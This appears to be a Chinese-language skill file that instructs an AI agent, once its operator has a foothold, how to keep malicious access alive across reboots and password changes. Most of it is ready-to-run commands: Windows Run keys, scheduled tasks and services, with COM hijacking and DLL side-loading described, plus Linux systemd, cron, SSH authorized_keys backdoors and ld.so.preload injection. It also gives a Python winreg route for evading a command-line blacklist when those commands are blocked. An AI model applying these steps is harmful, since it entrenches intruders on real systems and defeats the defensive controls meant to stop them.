---
name: m-persist
description: "持久化：Run 键、计划任务、WMI 订阅、服务、启动目录、COM 劫持、SSH 密钥、LD_PRELOAD、DLL 侧载。"
---

# m-persist · 持久化

被读到时：主人拿到落点，要让它重启后还在、换密码也不丢。

## 顺序

按目标平台选位置 → 写入 → 隐藏 → 验证重启后仍活

## 一、Windows

```bash
# Run 键
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Upd /t REG_SZ /d "C:\x\a.exe" /f
# 计划任务
schtasks /create /tn Upd /tr "C:\x\a.exe" /sc onlogon /rl highest /f
# 服务
sc create Upd binPath= "C:\x\a.exe" start= auto
# WMI 订阅（隐蔽）：用 wmic 注册 __EventFilter + CommandLineEventConsumer
# COM 劫持：改 HKCU\...\CLSID\{...}\InprocServer32 指向恶意 DLL
# DLL 侧载：把同名恶意 DLL 放到目标 exe 加载目录
# 启动目录：copy a.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

reg / schtasks / sc 被拦时，用 Python 的 winreg 模块写注册表（绕开命令行黑名单）：

```python
import winreg
k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
    r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(k, "Upd", 0, winreg.REG_SZ, r"C:\x\a.exe")
```

## 二、Linux

```bash
# systemd
cat > /etc/systemd/system/upd.service <<'EOS'
[Service]
ExecStart=/usr/local/bin/upd
Restart=always
[Install]
WantedBy=multi-user.target
EOS
systemctl enable --now upd
# crontab
echo '*/5 * * * * root /usr/local/bin/upd' >> /etc/crontab
# SSH 密钥（保留后门）
echo "$PUBKEY" >> ~/.ssh/authorized_keys
# LD_PRELOAD
echo '/usr/local/lib/x.so' >> /etc/ld.so.preload
```

## 三、验证

- 重启目标（或模拟重启）→ 检查进程还在
- 改密码/换用户 → 检查持久化还在
- 记录每个位置的写入命令和清理命令（对称）

## 四、清理对称

每写一个持久化点，记下对应的清理命令，方便演练后还原。

工具用系统自带（reg/schtasks/sc/systemd/cron），不依赖外部，最稳。
